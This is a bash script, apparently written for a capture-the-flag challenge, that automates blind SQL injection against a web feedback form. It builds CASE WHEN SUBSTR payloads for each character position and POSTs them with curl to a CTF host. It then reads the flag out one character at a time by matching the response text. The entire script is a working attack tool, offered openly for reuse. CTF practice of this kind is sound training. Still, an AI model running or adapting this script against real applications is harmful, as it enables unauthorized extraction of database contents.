#!/bin/bash

#This is a script for blind sqli testing 
#yes i AM  aware that python is also an option
#but havin a bash script seems kinda fun too, right? ;) 
#anyone can use this , ffo

chars=( {a..z} {0..9} {A..Z} '{' '}' ) #characters to use to test

#chars=( {0..9} '{' '}' ) #characters to use to test

query="tree'),('fauna', CASE WHEN (SELECT SUBSTR(flag, 3, 1) FROM flag) = 'l' THEN 'milf' ELSE NULL END), fauna', 'green" #sql query

pos=1 #current position 

while [[ $pos -le 40 ]]; #while loop 1, the value here defines the maximum number of characters to test 
do
	for inject in "${chars[@]}" #for loop to loop through each character
	do
		query="tree'),('fauna', CASE WHEN (SELECT SUBSTR(flag, $pos, 1) FROM flag) = '$inject' THEN 'milf' ELSE NULL END),('fauna', 'green" # creating the new quert using the character and position
		
		
		response=$(curl http://a08eb8277453dcf8d879f.playat.flagyard.com/ -b cookie.txt -X POST -d "feedback=$query")  #url to attack
		
		
		echo "testing ${inject}" #verbose output
		
		if echo "$response" | grep "Thanks for the feedback" ; then   #catch outputs you want
			echo "found"
			echo "${pos}: ${inject}" >> log.txt #write the position and the caught character into a tezt file, the numbering(position) is to check if any characters where skipped
			
			echo -n "${inject}" >> flag.txt #final flag without position count
			
			break; #save time afetr finding the matching character
		fi
	done;
	((pos += 1)) #increase the position 
done;
